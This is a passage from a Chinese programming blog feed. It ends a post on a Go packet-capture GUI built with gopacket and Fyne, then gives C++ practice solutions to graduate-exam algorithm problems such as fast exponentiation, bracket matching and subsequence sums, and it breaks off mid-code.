packet.TransportLayer() == <span class="literal">nil</span> || packet.TransportLayer().LayerType() != layers.LayerTypeTCP &#123;</span><br><span class="line">                log.Println(<span class="string">&quot;Unusable packet&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">             &#125;</span><br><span class="line">             tcp := packet.TransportLayer().(*layers.TCP)</span><br><span class="line">             assembler.AssembleWithTimestamp(packet.NetworkLayer().NetworkFlow(), tcp, packet.Metadata().Timestamp)</span><br><span class="line">          <span class="keyword">case</span> &lt;-ticker:</span><br><span class="line">             <span class="comment">// Every minute, flush connections that haven&#x27;t seen activity in the past 2 minutes.</span></span><br><span class="line">             assembler.FlushOlderThan(time.Now().Add(time.Minute * <span class="number">-2</span>))</span><br><span class="line">          &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       No++</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>assembler.AssembleWithTimestamp(packet.NetworkLayer().NetworkFlow(), tcp, packet.Metadata().Timestamp)</code>进行了TCP重组，防止TCP分片把HTTP数据包分呈好几片，看不了一点。</p><p>在调用AssembelWithTimestamp()时，内置函数会自动调用(h *httpStreamFactory) New()函数处理HTTP流量</p><p>重构一下New函数为自己的处理逻辑，比如装入一个新struct，在GUI展示的时候就很好办了。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *httpStreamFactory)</span></span> New(net, transport gopacket.Flow) tcpassembly.Stream &#123;</span><br><span class="line">    hstream := &amp;httpStream&#123;</span><br><span class="line">       net:       net,</span><br><span class="line">       transport: transport,</span><br><span class="line">       r:         tcpreader.NewReaderStream(),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    src, dst := transport.Endpoints()</span><br><span class="line">    <span class="keyword">if</span> fmt.Sprintf(<span class="string">&quot;%v&quot;</span>, src) == <span class="string">&quot;80&quot;</span> &#123;</span><br><span class="line">       <span class="keyword">go</span> hstream.runResponse() <span class="comment">// 处理响应</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> fmt.Sprintf(<span class="string">&quot;%v&quot;</span>, dst) == <span class="string">&quot;80&quot;</span> &#123;</span><br><span class="line">       <span class="keyword">go</span> hstream.runRequest() <span class="comment">// 处理请求</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> fmt.Sprintf(<span class="string">&quot;%v&quot;</span>, dst) == <span class="string">&quot;443&quot;</span> &#123;</span><br><span class="line">       <span class="keyword">go</span> hstream.runRequests() <span class="comment">// 处理HTTPS请求</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="keyword">go</span> hstream.run() <span class="comment">// 处理其他流量</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//fmt.Println(pkgData)</span></span><br><span class="line">    <span class="keyword">return</span> &amp;hstream.r</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="main-go"><a href="#main-go" class="headerlink" title="main.go"></a>main.go</h3><p>首先，main.go进行了字体初始化，并调用了应用程序的主程序进行阻塞响应。</p><p>在Run()对Fyne窗口进行了一系列设置。可以先忽略带HTTP函数的内容，因为基本都是函数复用。</p><p>LoadMenus加载菜单，LoadLayers()为点击数据包的如下内容，对LayersData数据做展示，</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240506170807012.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240506170807012.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240506170807012"></p><p>PkgInfo为点击数据包的如下内容，使用NewTable进行展示。</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240506170940397.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240506170940397.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240506170940397"></p><p>Monitor为右下角的网卡信息。</p>]]></content>
      
      
      <categories>
          
          <category> 杂七杂八 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>考研C++算法练习</title>
      <link href="/2024/03/01/kao-yan-c-suan-fa-lian-xi/"/>
      <url>/2024/03/01/kao-yan-c-suan-fa-lian-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="算法练习（C-代码）"><a href="#算法练习（C-代码）" class="headerlink" title="算法练习（C++代码）"></a>算法练习（C++代码）</h2><p>考研上机或C语言代码笔试准备，暨大机试原题+letcode+牛客+中南大等高校机试</p><h3 id="快速幂算法"><a href="#快速幂算法" class="headerlink" title="快速幂算法"></a>快速幂算法</h3><p>题目：输入一个整数 n ，求 n^n 的<strong>个位数</strong>是多少。</p><blockquote><p>快速幂算法：指数为偶数，则底数平方，指数除二；指数为奇数，则指数减一再把结果乘底数，底数平方，指数除二。指数看作二进制，除二可以看作位运算。</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">cin&gt;&gt;n;</span><br><span class="line"><span class="type">int</span> power=n;</span><br><span class="line"><span class="type">int</span> base=n;</span><br><span class="line"><span class="type">int</span> result = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(power&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(power%<span class="number">2</span>==<span class="number">1</span>)&#123;</span><br><span class="line">result *= base;</span><br><span class="line">power /= <span class="number">2</span>;</span><br><span class="line">base *= base;<span class="comment">//指数为奇数，先乘底数。除二小数部分舍去。底数平方 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">power /= <span class="number">2</span>;</span><br><span class="line">base *= base;<span class="comment">//指数为偶数，除二，底数平方 </span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cout&lt;&lt;result&lt;&lt;endl; </span><br><span class="line">cout&lt;&lt;result%<span class="number">10</span>;<span class="comment">//mod 10即个位数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240301105155142.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240301105155142.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240301105155142"></p><h3 id="斐波那契"><a href="#斐波那契" class="headerlink" title="斐波那契"></a>斐波那契</h3><p>输入一个整数 n ，求斐波那契数列的第 n 项。第一项是1， 第二项是1。<strong>要求必须递归！</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">f</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">1</span>||n==<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="built_in">f</span>(n<span class="number">-2</span>)+<span class="built_in">f</span>(n<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    cout&lt;&lt;<span class="built_in">f</span>(n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="成绩排名"><a href="#成绩排名" class="headerlink" title="成绩排名"></a>成绩排名</h3><p>对 n 个同学的考试成绩从大到小排名，成绩相同的算同一名。求排名为 m 的成绩。若无排名为m的成绩，输出最后一名的成绩。</p><ul><li>输入格式</li></ul><p>一共三行</p><p>第一行：一个整数 n，表示同学的个数。</p><p>第二行：n 个整数，表示 n 个同学的成绩。</p><p>第三行：一个整数 m，表示排名。</p><ul><li>输出格式</li></ul><p>一个整数，表示排名为 m 的成绩。</p><ul><li>输入样例</li></ul><p>6<br> 100 100 99 98 97</p><p>2</p><ul><li>输出样例</li></ul><p>99</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;输入同学个数：&quot;</span>&lt;&lt;endl;</span><br><span class="line">cin&gt;&gt;n;</span><br><span class="line"><span class="type">int</span> score[n];</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;输入同学的成绩：&quot;</span>&lt;&lt;endl;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">cin&gt;&gt;score[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//cout&lt;&lt;&quot;1&quot;;</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=n-i<span class="number">-1</span>;j&gt;<span class="number">0</span>;j--)&#123;</span><br><span class="line"><span class="keyword">if</span>(score[j]&gt;score[j<span class="number">-1</span>])&#123;</span><br><span class="line"><span class="type">int</span> temp = score[j];</span><br><span class="line">score[j] = score[j<span class="number">-1</span>];</span><br><span class="line">score[j<span class="number">-1</span>] = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="comment">//冒泡排序</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> i=<span class="number">0</span>,j;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;n;j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(score[j]!=score[i])&#123;</span><br><span class="line">score[++i]=score[j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="comment">//双指针去重</span></span><br><span class="line">cout&lt;&lt;<span class="string">&quot;输入要查询的排名：&quot;</span>&lt;&lt;endl;</span><br><span class="line">cin&gt;&gt;m;</span><br><span class="line"><span class="keyword">if</span>(m&gt;i+<span class="number">1</span>)&#123;</span><br><span class="line">cout&lt;&lt;score[i]&lt;&lt;endl; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">cout&lt;&lt;score[m<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="括号匹配"><a href="#括号匹配" class="headerlink" title="括号匹配"></a>括号匹配</h3><p>给定三种括号{ }，[ ], ( )，和若干小写字母的字符串，请问改字符串的括号是否匹配（可以嵌套）?</p><ul><li>输入输出</li></ul><p>输入格式：字符串s。 输出格式：若匹配，输出yes，否则输出no。</p><ul><li>输入样例</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;[a(v)d]q&#125;</span><br></pre></td></tr></table></figure><ul><li>输出样例</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yes</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">stack &lt;<span class="type">int</span>&gt; s;</span><br><span class="line">string strs;</span><br><span class="line">cin&gt;&gt;strs;</span><br><span class="line"><span class="type">int</span> m = strs.<span class="built_in">length</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(strs[i]==<span class="string">&#x27;(&#x27;</span>||strs[i]==<span class="string">&#x27;&#123;&#x27;</span>||strs[i]==<span class="string">&#x27;[&#x27;</span>)&#123;</span><br><span class="line">s.<span class="built_in">push</span>(strs[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(strs[i]==<span class="string">&#x27;)&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!s.<span class="built_in">empty</span>()&amp;&amp;s.<span class="built_in">top</span>()==<span class="string">&#x27;(&#x27;</span>) s.<span class="built_in">pop</span>();</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;不匹配&quot;</span>; </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(strs[i]==<span class="string">&#x27;&#125;&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!s.<span class="built_in">empty</span>()&amp;&amp;s.<span class="built_in">top</span>()==<span class="string">&#x27;&#123;&#x27;</span>) s.<span class="built_in">pop</span>();</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;不匹配&quot;</span>; </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(strs[i]==<span class="string">&#x27;]&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!s.<span class="built_in">empty</span>()&amp;&amp;s.<span class="built_in">top</span>()==<span class="string">&#x27;[&#x27;</span>) s.<span class="built_in">pop</span>();</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;不匹配&quot;</span>; </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="comment">//特别注意，栈为空s.top()不返回NULL，而是程序出错</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (s.<span class="built_in">empty</span>()) cout&lt;&lt;<span class="string">&quot;匹配成功&quot;</span>;</span><br><span class="line"><span class="keyword">else</span> cout&lt;&lt;<span class="string">&quot;匹配失败&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id="判断回文串"><a href="#判断回文串" class="headerlink" title="判断回文串"></a>判断回文串</h3><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240302154623876.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240302154623876.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240302154623876"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//判断回文串</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isCircel</span><span class="params">(string &amp;str)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> m = str.<span class="built_in">length</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;m/<span class="number">2</span>;i++)&#123;<span class="comment">//中点结束</span></span><br><span class="line"><span class="keyword">if</span>(str[i]!=str[m-i<span class="number">-1</span>]) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">string str;</span><br><span class="line"><span class="built_in">getline</span>(cin,str);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">isCircel</span>(str)) cout&lt;&lt;<span class="string">&quot;yes&quot;</span>;</span><br><span class="line"><span class="keyword">else</span> cout&lt;&lt;<span class="string">&quot;No&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240302154747079.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240302154747079.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240302154747079"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240302154726168.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240302154726168.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240302154726168"></p><h3 id="格子涂色"><a href="#格子涂色" class="headerlink" title="格子涂色"></a>格子涂色</h3><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240302160745466.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240302160745466.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240302160745466"></p><p>这道题关键在n个格子，n-1格子里什么颜色。</p><ul><li>假设n-1格子里和第一个格子颜色相同，则第n个格子可以有两种选择，且f(n-1)&#x3D;f(n-2)</li><li>假设n-1格子里和第一个格子颜色不同，则第n个格子只有一种选择</li></ul><p>即第一种情况f(n)&#x3D;2*f(n-2)，第二种情况f(n)&#x3D;f(n-1)</p><p>递推公式：f(n) &#x3D; 2*f(n-2) + f(n-1)</p><p>且由于n&#x3D;3时，第三格必不能和前两格颜色相同，所以f(3)&#x3D;f(2)&#x3D;6</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//格子涂色</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">f</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(n==<span class="number">3</span>||n==<span class="number">2</span>) <span class="keyword">return</span> <span class="number">6</span>;</span><br><span class="line"><span class="keyword">if</span>(n==<span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>*<span class="built_in">f</span>(n<span class="number">-2</span>) + <span class="built_in">f</span>(n<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">cin &gt;&gt;n;</span><br><span class="line">cout&lt;&lt;<span class="built_in">f</span>(n);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240302162327657.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240302162327657.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240302162327657"></p><h3 id="递增最大子序列和"><a href="#递增最大子序列和" class="headerlink" title="递增最大子序列和"></a>递增最大子序列和</h3><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240302165646642.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240302165646642.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240302165646642"></p><p>最大的困难，读题：比如1 3 7 2 10的序列，要求找出一个递增子序列，也就是1 3 7满足，1 3 7 2不满足。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//递增子序列最大和</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">f</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;m)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> maxsum=<span class="number">0</span>;<span class="type">int</span> n=m.<span class="built_in">size</span>();</span><br><span class="line"><span class="type">int</span> temp=m[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(m[i]&gt;m[i<span class="number">-1</span>])&#123;<span class="comment">//后面一个比前面的大，即递增，加到当前最大和</span></span><br><span class="line">temp += m[i];</span><br><span class="line"><span class="keyword">if</span>(temp &gt; maxsum)&#123;<span class="comment">//当前最大和&gt;最大子序列和</span></span><br><span class="line">maxsum = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">temp = m[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> maxsum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">m</span><span class="params">(n)</span></span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">cin&gt;&gt;m[i];</span><br><span class="line">&#125;</span><br><span class="line">cout&lt;&lt;<span class="built_in">f</span>(m);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240302170011890.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240302170011890.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240302170011890"></p><h3 id="最大子序列和"><a href="#最大子序列和" class="headerlink" title="最大子序列和"></a>最大子序列和</h3><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240304144651558.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240304144651558.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240304144651558"></p><p>分为两种情况：比如1 -3 7 8 -4 12 -10 6</p><ul><li>假如到了i位置，判断这个位置要不要也加入子序列，先判断前面的子序列和是否大于0，比如1 -3相加为-2，则从7开始一定比加上前面的序列和更大。如果前面的子序列大于0，如 7 8 -4，则使用前面的子序列。</li><li>如果序列全负，如 -3 -2 -1 -4 -5 -6 -7 -8，则应该子序列只包含-1项。初始化最大子序列和为首项即可，如果初始化为0无法判断上述情况</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 